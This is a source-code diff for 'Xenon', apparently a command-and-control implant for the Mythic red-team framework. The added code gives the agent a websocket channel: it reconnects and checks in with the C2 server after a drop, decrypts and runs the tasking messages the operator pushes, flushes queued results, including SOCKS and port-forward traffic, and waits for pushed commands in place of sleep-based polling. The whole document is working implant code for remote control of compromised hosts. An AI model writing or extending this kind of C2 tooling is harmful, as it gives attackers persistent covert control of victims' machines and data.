@@ -1,8 +1,12 @@
 #include "Xenon.h"
 #include "Task.h"
+#include "Checkin.h"
 
 #include "Sleep.h"
 #include "Config.h"
+#include "Package.h"
+#include "Parser.h"
+#include "TransportWebsocket.h"
 
 #include "Tasks/Agent.h"
 #include "Tasks/Shell.h"
@@ -423,8 +427,64 @@ VOID TaskRoutine()
 
 #endif
 
-    /* Handle all those resposnes */
+#ifdef WEBSOCKET_TRANSPORT
 
+    /* Reconnect + re-checkin if the Push socket dropped */
+    if ( !WebsocketIsConnected() )
+    {
+        _dbg("[WS] Disconnected - reconnecting and re-checking in");
+        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+        if ( !WebsocketConnect() || !CheckinSend() )
+        {
+            _err("[WS] Reconnect/checkin failed - will retry");
+            WebsocketClose();
+            return;
+        }
+    }
+
+
+    PackageSendAll(NULL);
+
+
+    /* Drain all pushed inbound Mythic messages */
+    {
+        PBYTE  pInData = NULL;
+        SIZE_T InLen   = 0;
+
+        while ( WebsocketReceive(&pInData, &InLen) )
+        {
+            if ( pInData != NULL && InLen != 0 )
+            {
+                PARSER Inbound = { 0 };
+
+                ParserNew(&Inbound, pInData, InLen);
+
+                LocalFree(pInData);
+                pInData = NULL;
+
+                ParserDecrypt(&Inbound);
+
+                if ( Inbound.Buffer != NULL && Inbound.Length != 0 )
+                {
+                    _dbg("[WS] Pushed message from Mythic: %d bytes", Inbound.Length);
+                    TaskProcess(&Inbound);
+                }
+
+                ParserDestroy(&Inbound);
+            }
+
+            pInData = NULL;
+            InLen   = 0;
+        }
+    }
+
+#endif
+
+    /* Handle all those responses */
+
+#ifdef WEBSOCKET_TRANSPORT
+    /* TaskProcess already ran for each inbound frame above */
+#else
     if ( Output.Buffer != NULL && Output.Length != 0 )
     {
         
@@ -432,6 +492,7 @@ VOID TaskRoutine()
     }
 
     if (&Output != NULL) ParserDestroy(&Output);
+#endif
     
 
     /* Check all Links and push delegates to Server */
@@ -462,11 +523,40 @@ VOID TaskRoutine()
 
 #endif
 
+#ifdef WEBSOCKET_TRANSPORT
+
+    /*
+     * Flush anything TaskProcess / SocksPush / etc. just queued.
+     * Without this, responses sit until the next inbound wake-up.
+     */
+    PackageSendAll(NULL);
+
+#endif
+
 
 CLEANUP:
 
+#ifdef WEBSOCKET_TRANSPORT
+
+    /*
+     * True Push idle: block until Mythic pushes a frame.
+     * When local tunnels/downloads need servicing, use a short wait so
+     * SocksPush/RportfwdPush/DownloadPush keep ticking without C2 polls.
+     * If disconnected, never INFINITE-wait (nothing will signal).
+     */
+    if ( !WebsocketIsConnected() )
+        return;
+    else if ( WebsocketNeedsLocalPump() )
+        WebsocketWaitInbound(0);
+    else
+        WebsocketWaitInbound(INFINITE);
+
+#else
+
     // zzzz
     SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+
+#endif
 
     return;
 }
